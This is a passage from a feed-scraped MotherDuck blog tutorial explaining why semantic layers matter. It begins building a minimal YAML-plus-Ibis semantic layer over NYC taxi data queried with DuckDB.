</ul>
</li>
</ul>
<h2 id="try-it-yourself">Try it yourself<a href="#try-it-yourself" aria-label="Direct link to Try it yourself" title="Direct link to Try it yourself">​</a></h2>
<p>This is live now in the D2 Playground. Try opening the below code block (click top right
of it).</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why Semantic Layers Matter (and how to build one with DuckDB) (146 pts)]]></title>
            <link>https://motherduck.com/blog/semantic-layer-duckdb-tutorial/</link>
            <guid>44953575</guid>
            <pubDate>Tue, 19 Aug 2025 16:49:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://motherduck.com/blog/semantic-layer-duckdb-tutorial/">https://motherduck.com/blog/semantic-layer-duckdb-tutorial/</a>, See on <a href="https://news.ycombinator.com/item?id=44953575">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Many ask themselves, "Why would I use a semantic layer? What is it anyway?" In this hands-on guide, we’ll build the simplest possible semantic layer using just a YAML file and a Python script—not as the goal itself, but as a way to understand the value of semantic layers. We’ll then query 20 million NYC taxi records with consistent business metrics executed using DuckDB and Ibis. By the end, you’ll know exactly when a semantic layer solves real problems and when it’s overkill.</p>
<p>It's a topic that I'm passionate about as I've been using semantic layers within a Business Intelligence (BI) tool for over twenty years, and only recently have we gotten full-blown semantic layers that can sit outside of a BI tool, combining the advantages of a logical layer with sharing them across your web apps, notebooks, and BI tools. With a semantic layer, your revenue KPI or other complex company measures are defined once in a single source of truth—no need to re-implement them over and over again.</p>
<p>We'll have a look at the simplest possible semantic layer, which uses a simple YAML file (for the semantics) and a Python script for executing it with Ibis and DuckDB. We'll do a quick recap of the semantic layer before diving into a practical code example.</p>
<p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: Find the Code on GitHub</span></span>
For all the examples shown in this article, find the code on the GitHub repository <a href="https://github.com/sspaeti/semantic-layer-duckdb">semantic-layer-duckdb</a>.
</span></p><section><h2 id="when-you-dont-need-a-semantic-layer">When You Don't Need a Semantic Layer</h2><p>Let's start by exploring when you don't need a semantic layer and when it's the wrong choice. The simplest and most straightforward reasons are:</p><ul>
<li>You're just getting started with analytics and only have one consumer, meaning you only have one way of showcasing analytics data, for example, a BI tool, notebooks, or a web app, but not multiple ways of presenting data. This means you don't apply calculated logic in different places.</li>
<li>You don't have extensive business logic that you query ad hoc; you have simple counts, SUMs, or averages.</li>
<li>You preprocess all your metrics as SQL transformations into physical tables, meaning your downstream analytics tools get all metrics preprocessed and aggregated, and filtering is fast enough.</li>
</ul></section>
<section><h2 id="why-use-a-semantic-layer">Why Use a Semantic Layer?</h2><p>So when do we actually need one, and what is it? There's a lot of information out there, including from myself about the <a href="https://www.ssp.sh/blog/rise-of-semantic-layer-metrics/">history and rise [2022]</a>, comparing it to an <a href="https://cube.dev/blog/exploring-the-semantic-layer-through-the-lens-of-mvc">MVC-like approach</a>, or explaining its <a href="https://cube.dev/blog/universal-semantic-layer-capabilities-integrations-and-enterprise-benefits">capabilities</a>. That's why in this article I focus on the <em>why</em> and showcase how to use it in a practical example in the next chapter.</p><p>The main reasons for using a semantic layer may be one or more of the following needs:</p><ol>
<li><strong>Unified place</strong> to define ad hoc queries once, version-controlled and collaboratively, with the possibility of pulling them into different BI tools, web apps, notebooks, or AI/MCP integration. Avoid <strong>duplication</strong> of metrics in every tool, making <strong>maintainability</strong> and data governance much easier; resulting in a <strong>consistent business layer</strong> with encapsulated business logic.</li>
</ol><p><em><strong>Example</strong></em>: Most organizations quickly run multiple BI tools simultaneously with additional Excel or Google Sheets. Instead of maintaining separate calculated fields and business logic in each tool in a proprietary format, semantic layers provide one definition that works across all platforms.</p><ol start="2">
<li><strong>Caching</strong> is needed for ad hoc queries that are based on various source databases. Defining the metrics that enable pre-calculations for sub-second query responses can benefit any downstream analytics tools compared to implementing custom database connections and different databases. Eliminating potential <strong>data movement costs</strong> by querying data where it lives, using dialect-optimized SQL pushdown across heterogeneous sources. This reduces infrastructure overhead and cloud computing costs.</li>
</ol><p><em><strong>Example</strong></em>: For a non-production or high-load OLTP source, the semantic layer can directly query the various data sources (e.g., IoT data, logs, and other data) instead of moving them into a data lake or data warehouse, and through the cache of the semantic layer, it's fast enough without data movement.</p><ol start="3">
<li>Unified <strong>access-level security</strong> through <strong>various APIs</strong> (REST, GraphQL, SQL, ODBC/JDBC, MDX/Excel) as well. Unified Analytics API enables self-serve BI by allowing users to connect Excel to a cleaned, fast, and unified API.</li>
</ol><p><em><strong>Example</strong></em>: Centralized row-level and column-level security that works consistently across all downstream analytics tools, rather than trying to manage access controls separately in each BI tool or analytics tool that has access to the data. Users can connect directly with Excel and have the correct permissions and calculated business metrics out of the box.</p><ol start="4">
<li><strong>Dynamic query rewriting</strong> automatically translates simple, business-friendly queries into complex, optimized SQL across multiple databases. This enables users to write intuitive queries using business concepts (like "average_order_value") without needing to know the underlying data model complexity, table relationships, or database-specific syntax. The semantic layer <strong>abstracts</strong> complex analytics, such as ratios at different grains, time ranges (YoY, trailing periods), and custom calendars, into simple semantic queries.</li>
</ol><p><em><strong>Example</strong></em>: Complex analytics simplified by handling sophisticated calculations that are painful in raw SQL: ratios at different grains (like per-member-per-month in insurance), time intelligence (year-over-date, trailing 12 months, period-over-period), and custom calendar logic. These become simple semantic queries rather than complex subqueries with distinct counts.</p><ol start="5">
<li>Context for LLMs to improve accuracy and natural language querying can be significantly enhanced with a semantic layer, which provides business context and prevents AI from hallucinating frequently, as most of the business logic is configured and defined in a semantic layer, sometimes even data models, to help LLMs further understand the business.</li>
</ol><p><em><strong>Example</strong></em>: Internal Large Language Models (LLMs) or Retrieval-Augmented Generation (RAG) systems need business context to understand the business. A semantic layer's connection of dimensions and facts, along with metric definitions, can help the model understand and suggest better SQL queries or responses through natural language.</p><hr><p>More broadly, semantic layers bridge the gap between business needs and data source integration in a very organized and governed way. They are best optimized for larger enterprises with numerous scattered KPIs that can afford to add another layer to their data stack. However, the example below uses the simplest and smallest semantic layer, even with little data.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>EXAMPLE<!-- -->: If you want to know more</span></span>
Brian Bickell gave a great talk at the Practical Data Community about semantic layers and the problem they solve. I highly recommend checking that out too at <a href="https://youtu.be/kcctcQhlxOw?si=hdRHLFlWY11bYNgl&amp;t=1119">Semantic Layer Deep Dive</a>. If you're already on the Practical Data show from Joe Reis, also check out Hamilton Ulmer's presentation about <a href="https://www.youtube.com/watch?v=EOpkSsSDv40&amp;t=2457s">Instant SQL with DuckDB/MotherDuck</a>, not entirely about semantic layers, but related to the history of SQL and CTEs and how instant SQL can help.
</span><section><h3 id="datasets-vs-aggregations">Datasets vs. Aggregations</h3><p>An important distinction is whether we need <strong>persistent</strong> datasets or we want <strong>ad hoc</strong> queries. These are typically very different. Ad hoc queries must be flexible and change granularity based on added dimensions. This means someone running a query might switch from a daily view to a weekly or monthly one, add a region, and then decide to roll it up to a country level; all of this can happen in a couple of seconds. Therefore, there is no time to refresh or process the data.</p><p>Calculated measures need to be added on the fly, without requiring an ETL job to be reprocessed. A common workaround is to create multiple persistent physical datasets with dbt, each containing the same data but with varying granularity, allowing for the display of different charts in the BI tool with different focuses. A semantic layer, or ad hoc queries, does that on the fly.</p><p>We can differentiate and say:</p><ul>
<li>dataset ≠ aggregations</li>
<li>table columns ≠ metrics</li>
<li>physical table ≠ logical definition</li>
</ul><p>If you find yourself needing the concepts on the right side, that's when you need a semantic layer—whether built into a BI tool or implemented separately for the reasons mentioned above.</p></section></section>
<section><h2 id="how-a-semantic-layer-works-a-practical-example">How a Semantic Layer Works: A Practical Example</h2><p>Now let's see this in action by analyzing the most pragmatic semantic layer there is. The simplest semantic layer I found is by Julien Hurault, who recently announced the release of the <a href="https://github.com/boringdata/boring-semantic-layer">Boring Semantic Layer (BSL)</a> project. We use DuckDB as the query engine and Python with <a href="https://github.com/ibis-project/ibis">Ibis</a> for the execution layer.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: What this Semantic Layer does not have</span></span>
This is a relatively simple semantic layer. More advanced ones include additional features such as multiple robust APIs (REST, GraphQL, SQL, ODBC, Excel), advanced security controls, and a powerful caching layer.
This example focuses on the <a href="https://en.wikipedia.org/wiki/Logical_schema">Logical Data Model</a>, where we can define our business requirements within YAML, an abstraction above our physical layer. Although this is quite close to the physical layer, this is where more advanced semantic layer tools (Cube, dbt SL, GoodData, AtScale) give you more advantages in an enterprise setting.
</span><p>We're going to build something like what's illustrated below—where we have YAML definitions as our metrics, such as calculated measures and dimensions, and Ibis for the query translation to run <a href="https://github.com/ibis-project/ibis#how-it-works">any execution engine</a>; here we use DuckDB.</p><img alt="img1" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75"><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 1.5C6.71442 1.5 5.45772 1.88122 4.3888 2.59545C3.31988 3.30968 2.48676 4.32484 1.99479 5.51256C1.50282 6.70028 1.37409 8.00721 1.6249 9.26809C1.8757 10.529 2.49477 11.6872 3.40381 12.5962C4.31285 13.5052 5.47104 14.1243 6.73192 14.3751C7.99279 14.6259 9.29973 14.4972 10.4874 14.0052C11.6752 13.5132 12.6903 12.6801 13.4046 11.6112C14.1188 10.5423 14.5 9.28558 14.5 8C14.4982 6.27665 13.8128 4.62441 12.5942 3.40582C11.3756 2.18722 9.72335 1.50182 8 1.5ZM8 13.5C6.91221 13.5 5.84884 13.1774 4.94437 12.5731C4.0399 11.9687 3.33495 11.1098 2.91867 10.1048C2.50238 9.09977 2.39347 7.9939 2.60568 6.927C2.8179 5.86011 3.34173 4.8801 4.11092 4.11091C4.8801 3.34172 5.86011 2.8179 6.92701 2.60568C7.9939 2.39346 9.09977 2.50238 10.1048 2.91866C11.1098 3.33494 11.9687 4.03989 12.5731 4.94436C13.1774 5.84883 13.5 6.9122 13.5 8C13.4983 9.45818 12.9184 10.8562 11.8873 11.8873C10.8562 12.9184 9.45819 13.4983 8 13.5ZM9 11C9 11.1326 8.94732 11.2598 8.85356 11.3536C8.75979 11.4473 8.63261 11.5 8.5 11.5C8.23479 11.5 7.98043 11.3946 7.7929 11.2071C7.60536 11.0196 7.5 10.7652 7.5 10.5V8C7.36739 8 7.24022 7.94732 7.14645 7.85355C7.05268 7.75979 7 7.63261 7 7.5C7 7.36739 7.05268 7.24021 7.14645 7.14645C7.24022 7.05268 7.36739 7 7.5 7C7.76522 7 8.01957 7.10536 8.20711 7.29289C8.39465 7.48043 8.5 7.73478 8.5 8V10.5C8.63261 10.5 8.75979 10.5527 8.85356 10.6464C8.94732 10.7402 9 10.8674 9 11ZM7 5.25C7 5.10166 7.04399 4.95666 7.1264 4.83332C7.20881 4.70999 7.32595 4.61386 7.46299 4.55709C7.60003 4.50032 7.75083 4.48547 7.89632 4.51441C8.04181 4.54335 8.17544 4.61478 8.28033 4.71967C8.38522 4.82456 8.45665 4.9582 8.48559 5.10368C8.51453 5.24917 8.49968 5.39997 8.44291 5.53701C8.38615 5.67406 8.29002 5.79119 8.16668 5.8736C8.04334 5.95601 7.89834 6 7.75 6C7.55109 6 7.36032 5.92098 7.21967 5.78033C7.07902 5.63968 7 5.44891 7 5.25Z" fill="#383838"></path></svg> <span>INFO<!-- -->: Data Catalogs</span></span>
If you wonder how <a href="https://ducklake.select/">DuckLake</a> or other open table format catalogs (Iceberg, Unity, Polaris) fit into the picture, they would be connected to the metrics definition. Hence, the catalog has the complete list of available data assets. You can view open data catalogs as a lookup service for the datasets in your data lake. If you use a semantic layer as we implement here, you won't need an additional catalog because all your metrics and dimensions are defined within the semantic layer itself.
</span><section><h3 id="getting-started">Getting Started</h3><p>Let's create a virtual environment where we install our dependencies and install the semantic layer:</p><pre><code>git <span>clone</span> git@github.com:sspaeti/semantic-layer-duckdb.git
uv <span>sync</span> <span>#installs dependencies</span>
</code></pre><p>That will not only install the semantic layer, but also Ibis and other requirements.</p><p>Now we are ready to define our metrics. To simplify this example and focus on the metrics rather than the data, I utilized the <a href="https://www.nyc.gov/site/tlc/about/tlc-trip-record-data.page">NYC Taxi Dataset</a>, which we all know and are familiar with. They have a lookup table for pickups and lots of data we can use, and it is available via HTTPS.</p><span type="[object Object]"><span type="[object Object]"><svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 12C11 11.7348 11.1054 11.4804 11.2929 11.2929C11.4804 11.1054 11.7348 11 12 11H20C20.2652 11 20.5196 11.1054 20.7071 11.2929C20.8946 11.4804 21 11.7348 21 12C21 12.2652 20.8946 12.5196 20.7071 12.7071C20.5196 12.8946 20.2652 13 20 13H12C11.7348 13 11.4804 12.8946 11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12ZM12 17H20C20.2652 17 20.5196 16.8946 20.7071 16.7071C20.8946 16.5196 21 16.2652 21 16C21 15.7348 20.8946 15.4804 20.7071 15.2929C20.5196 15.1054 20.2652 15 20 15H12C11.7348 15 11.4804 15.1054 11.2929 15.2929C11.1054 15.4804 11 15.7348 11 16C11 16.2652 11.1054 16.5196 11.2929 16.7071C11.4804 16.8946 11.7348 17 12 17ZM16 19H12C11.7348 19 11.4804 19.1054 11.2929 19.2929C11.1054 19.4804 11 19.7348 11 20C11 20.2652 11.1054 20.5196 11.2929 20.7071C11.4804 20.8946 11.7348 21 12 21H16C16.2652 21 16.5196 20.8946 16.7071 20.7071C16.8946 20.5196 17 20.2652 17 20C17 19.7348 16.8946 19.4804 16.7071 19.2929C16.5196 19.1054 16.2652 19 16 19ZM28 6V19.5863C28.0008 19.849 27.9494 20.1093 27.8488 20.352C27.7482 20.5947 27.6003 20.815 27.4137 21L21 27.4137C20.815 27.6003 20.5947 27.7482 20.352 27.8488C20.1093 27.9494 19.849 28.0008 19.5863 28H6C5.46957 28 4.96086 27.7893 4.58579 27.4142C4.21071 27.0391 4 26.5304 4 26V6C4 5.46957 4.21071 4.96086 4.58579 4.58579C4.96086 4.21071 5.46957 4 6 4H26C26.5304 4 27.0391 4.21071 27.4142 4.58579C27.7893 4.96086 28 5.46957 28 6ZM6 26H19V20C19 19.7348 19.1054 19.4804 19.2929 19.2929C19.4804 19.1054 19.7348 19 20 19H26V6H6V26ZM21 21V24.5875L24.5863 21H21Z" fill="#383838"></path></svg> <span>NOTE<!-- -->: You can use MotherDuck Shared datasets</span></span>
If you want to use MotherDuck's shared datasets, please check out <a href="https://motherduck.com/docs/getting-started/sample-data-queries/datasets/">Example Datasets</a>, for example the <a href="https://motherduck.com/docs/getting-started/sample-data-queries/nyc-311-data/">NYC 311 Service Requests Data</a> is uploaded, as well as <a href="https://motherduck.com/docs/getting-started/sample-data-queries/foursquare/">Foursquare</a> and other helpful ones. You can query this data instantly by running duckdb and connecting to MotherDuck as showcased below:
<img alt="MotherDuck DuckDB Query Example" loading="lazy" decoding="async" data-nimg="fill" sizes="90vw,
                        (min-width: 728px) 800px,
                        (min-width: 960px) 950px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg3_sem_a554627e3c.png&amp;w=3840&amp;q=75">
</span><p>As we know now, semantic layers are suitable for defining metrics in a central and configurable way, so we use YAML for this. YAML has minimal overhead and is easy to read, which is why most semantic layers use it. Alternatively, SQL would be a better choice, but it lacks essential features like variables and tends to become overly nested and challenging to maintain. YAML, combined with occasional SQL injection, proves to be the most effective solution.</p><p>First, let's check out what data we are working with—we can quickly count and describe the tables:</p><pre><code>D <span>select</span> count(*) FROM read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>);
┌─────────────────┐
│  count_star()   │
│      int64      │
├─────────────────┤
│    19868009     │
│ (19.87 million) │
└─────────────────┘
D DESCRIBE FROM read_parquet(<span>"https://d37ci6vzurychx.cloudfront.net/trip-data/fhvhv_tripdata_2025-06.parquet"</span>);
┌──────────────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐
│     column_name      │ column_type │  null   │   key   │ default │  extra  │
│       varchar        │   varchar   │ varchar │ varchar │ varchar │ varchar │
├──────────────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤
│ hvfhs_license_num    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ dispatching_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ originating_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ request_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ on_scene_datetime    │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ pickup_datetime      │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ dropoff_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │
│ PULocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │
│ DOLocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │
│ trip_miles           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ trip_time            │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │
│ base_passenger_fare  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ tolls                │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ bcf                  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ sales_tax            │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ congestion_surcharge │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ airport_fee          │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ tips                 │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ driver_pay           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
│ shared_request_flag  │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ shared_match_flag    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ access_a_ride_flag   │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ wav_request_flag     │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ wav_match_flag       │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ cbd_congestion_fee   │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │
├──────────────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┤
│ 25 rows                                                          6 columns │
└────────────────────────────────────────────────────────────────────────────┘
</code></pre><p>As well as the CSV lookups:</p><pre><code>D <span>select</span> count(*) from read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>);
┌──────────────┐
│ count_star() │
│    int64     │
├──────────────┤
│     265      │
└──────────────┘
D describe from read_csv(<span>"https://d37ci6vzurychx.cloudfront.net/misc/taxi+_zone_lookup.csv"</span>);
┌──────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐
│ column_name  │ column_type │  null   │   key   │ default │  extra  │
│   varchar    │   varchar   │ varchar │ varchar │ varchar │ varchar │
├──────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤
│ LocationID   │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │
│ Borough      │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ Zone         │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
│ service_zone │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │
└──────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┘
